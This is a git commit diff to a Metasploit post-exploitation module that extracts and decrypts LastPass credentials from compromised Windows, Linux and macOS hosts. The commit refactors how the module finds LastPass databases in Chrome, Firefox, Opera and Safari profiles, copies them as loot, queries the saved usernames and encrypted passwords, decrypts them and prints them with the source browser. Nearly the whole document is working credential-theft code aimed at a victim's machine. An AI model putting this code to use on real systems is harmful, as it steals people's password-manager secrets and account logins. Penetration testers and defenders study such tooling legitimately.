43238c732471812c5eadc8fd6ea6ebf46c5ec7b9
Jon Hart <jon_hart@rapid7.com>
2014-10-17 11:19:36 -0700

    Simplify LastPass extraction.  Track what browser that puked creds

--- modules/post/multi/gather/lastpass_creds.rb
+++ modules/post/multi/gather/lastpass_creds.rb
@@ -11,12 +11,14 @@ class Metasploit3 < Msf::Post
 
   def initialize(info = {})
     super(update_info(info,
-    'Name' => 'LastPass Master Password Extractor',
-    'Description' => %q{This module extracts and decrypts login accounts and passwords stored by Lastpass.},
-    'License' => MSF_LICENSE,
-    'Author' => ['Alberto Garcia Illera <agarciaillera[at]gmail.com>', 'Martin Vigo <martinvigo[at]gmail.com>'],
-    'Platform' => %w{ linux osx unix win },
-    'SessionTypes' => [ 'meterpreter, shell' ]
+      'Name' => 'LastPass Master Password Extractor',
+      'Description' => %q{
+        This module extracts and decrypts LastPass master login accounts and passwords.
+      },
+      'License' => MSF_LICENSE,
+      'Author' => ['Alberto Garcia Illera <agarciaillera[at]gmail.com>', 'Martin Vigo <martinvigo[at]gmail.com>'],
+      'Platform' => %w(linux osx unix win),
+      'SessionTypes' => %w(meterpreter shell)
     ))
   end
 
@@ -26,48 +28,52 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    credentials_table = Rex::Ui::Text::Table.new('Header' => "LastPass credentials", 'Indent' => 1, 'Columns' => ["Username", "Password"])
-
     print_status "Searching for LastPass databases..."
 
-    db_paths = get_database_paths # Find databases and get the remote paths
-    if db_paths.empty?
+    db_map = get_database_paths # Find databases and get the remote paths
+    if db_map.empty?
       print_status "No databases found"
       return
     end
 
     print_status "Looking for credentials in all databases found..."
 
+    # an array of [user, encrypted password, browser]
     credentials = [] # All credentials to be decrypted
-    db_paths.each do |db_path|
-      if db_path =~ /Mozilla/i # Firefox
-        # Read and store the remote preferences file locally
-        data = read_file(db_path)
-        loot_path = store_loot('firefox.preferences', 'text/javascript', session, data, nil, "Firefox preferences file #{db_path}")
+    db_map.each_pair do |browser, paths|
+      if browser == 'Firefox'
+        paths.each do |path|
+          # Read and store the remote preferences file locally
+          data = read_file(path)
+          loot_path = store_loot('firefox.preferences', 'text/javascript', session, data, nil, "Firefox preferences file #{path}")
 
-        # Extract usernames and passwords from preference file
-        firefox_encoded_creds = firefox_credentials(loot_path)
-        next unless firefox_encoded_creds
-        firefox_encoded_creds.each do |creds|
-          credentials = [URI.unescape(creds[0]), URI.unescape(creds[1])] unless creds[0].nil? || creds[1].nil?
+          # Extract usernames and passwords from preference file
+          firefox_encoded_creds = firefox_credentials(loot_path)
+          next unless firefox_encoded_creds
+          firefox_encoded_creds.each do |creds|
+            credentials << [URI.unescape(creds[0]), URI.unescape(creds[1]), browser] unless creds[0].nil? || creds[1].nil?
+          end
         end
-
       else # Chrome, Safari and Opera
-        # Read and store the remote database locally
-        data = read_file(db_path)
-        loot_path = store_loot('lastpass.database', 'application/x-sqlite3', session, data, nil, "LastPass database #{db_path}")
+        paths.each do |path|
+          data = read_file(path)
+          loot_path = store_loot('lastpass.database', 'application/x-sqlite3', session, data, nil, "LastPass database #{path}")
 
-        # Parsing/Querying the DB
-        db = SQLite3::Database.new(loot_path)
-        credentials = db.execute("SELECT username, password FROM LastPassSavedLogins2 WHERE username IS NOT NULL AND username != '' AND password IS NOT NULL AND password != '';")
+          # Parsing/Querying the DB
+          db = SQLite3::Database.new(loot_path)
+          user, pass = db.execute("SELECT username, password FROM LastPassSavedLogins2 WHERE username IS NOT NULL AND username != '' AND password IS NOT NULL AND password != '';").flatten
+          credentials << [user, pass, browser] if user && pass
+        end
       end
+    end
 
-      # Parse and decrypt credentials
-      credentials.each do |row| # Decrypt passwords
-        print_status "Decrypting password for user #{row[0]}..."
-        password = clear_text_password(row[0], row[1])
-        credentials_table << [row[0], password]
-      end
+    credentials_table = Rex::Ui::Text::Table.new('Header' => "LastPass credentials", 'Indent' => 1, 'Columns' => %w(Username Password Browser))
+    # Parse and decrypt credentials
+    credentials.each do |row| # Decrypt passwords
+      user, enc_pass, browser = row
+      print_status "Decrypting password for user #{user} from #{browser}..."
+      password = clear_text_password(user, enc_pass)
+      credentials_table << [user, password, browser]
     end
     print_good credentials_table.to_s
   end
@@ -76,67 +82,53 @@ class Metasploit3 < Msf::Post
   def get_database_paths
     platform = session.platform
     existing_profiles = get_user_profiles
-    found_dbs_paths = []
+    found_dbs_map = {
+      'Chrome' => [],
+      'Firefox' => [],
+      'Opera' => [],
+      'Safari' => []
+    }
+
+    browser_path_map = {}
 
     case platform
     when /win/
       existing_profiles.each do |user_profile|
         print_status "Found user: #{user_profile['UserName']}"
-
-        # Check Firefox
-        path = "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles"
-        found_dbs_paths.push(find_db_paths(path, "Firefox"))
-
-        # Check Chrome
-        path = "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
-        found_dbs_paths.push(find_db_paths(path, "Chrome"))
-
-        # Check Opera
-        path = "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
-        found_dbs_paths.push(find_db_paths(path, "Opera"))
-
-        # Check Safari
-        path = "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
-        found_dbs_paths.push(find_db_paths(path, "Safari"))
+        browser_path_map = {
+          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
+          'Firefox' => "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles",
+          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
+          'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
+        }
       end
     when /unix|linux/
       existing_profiles.each do |user_profile|
         print_status "Found user: #{user_profile['UserName']}"
-
-        # Check Firefox
-        path = "#{user_profile['LocalAppData']}/.mozilla/firefox"
-        found_dbs_paths.push(find_db_paths(path, "Firefox"))
-
-        # Check Chrome
-        path = "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
-        found_dbs_paths.push(find_db_paths(path, "Chrome"))
+        browser_path_map = {
+          'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
+          'Firefox' => "#{user_profile['LocalAppData']}/.mozilla/firefox",
+        }
       end
     when /osx/
       existing_profiles.each do |user_profile|
         print_status "Found user: #{user_profile['UserName']}"
-
-        # Check Firefox
-        path = "#{user_profile['LocalAppData']}\\Firefox\\Profiles"
-        found_dbs_paths.push(find_db_paths(path, "Firefox"))
-
-        # Check Chrome
-        path = "#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
-        found_dbs_paths.push(find_db_paths(path, "Chrome"))
-
-        # Check Safari
-        path = "#{user_profile['AppData']}/Safari/Databases/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
-        found_dbs_paths.push(find_db_paths(path, "Safari"))
-
-        # Check Opera
-        path = "#{user_profile['LocalAppData']}/com.operasoftware.Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
-        found_dbs_paths.push(find_db_paths(path, "Opera"))
+        browser_path_map = {
+          'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
+          'Firefox' => "#{user_profile['LocalAppData']}\\Firefox\\Profiles",
+          'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
+          'Safari' => "#{user_profile['AppData']}/Safari/Databases/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
+        }
       end
-
     else
       print_error "platform not recognized: #{platform}"
     end
 
-    found_dbs_paths.flatten
+    browser_path_map.each_pair do |browser, path|
+      found_dbs_map[browser] |= find_db_paths(path, browser)
+    end
+
+    found_dbs_map
   end
 
   # Returns a list of DB paths found in the victims' machine
